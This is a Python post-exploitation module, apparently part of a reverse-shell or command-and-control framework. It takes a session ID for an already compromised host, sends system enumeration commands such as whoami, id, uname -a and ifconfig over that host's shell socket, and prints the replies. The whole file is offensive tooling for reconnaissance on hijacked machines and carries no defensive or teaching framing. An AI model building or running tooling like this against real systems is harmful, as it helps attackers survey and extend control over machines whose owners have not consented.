# post_expl/enum_system.py
from corelistener import session_handler

def run():
    try:
        sid = int(input("Enter SESSION ID: "))
    except:
        print("[-] Invalid input")
        return

    conn = session_handler.sessions.get(sid)
    if not conn:
        print("[-] Invalid session")
        return

    commands = ["whoami", "hostname", "uname -a", "id", "ifconfig || ip a"]
    for cmd in commands:
        conn.send(cmd.encode() + b"\n")
        conn.settimeout(0.2)
        out = b""
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk: break
                out += chunk
            except:
                break
        print(f"\n[+] {cmd}:\n{out.decode(errors='ignore')}")
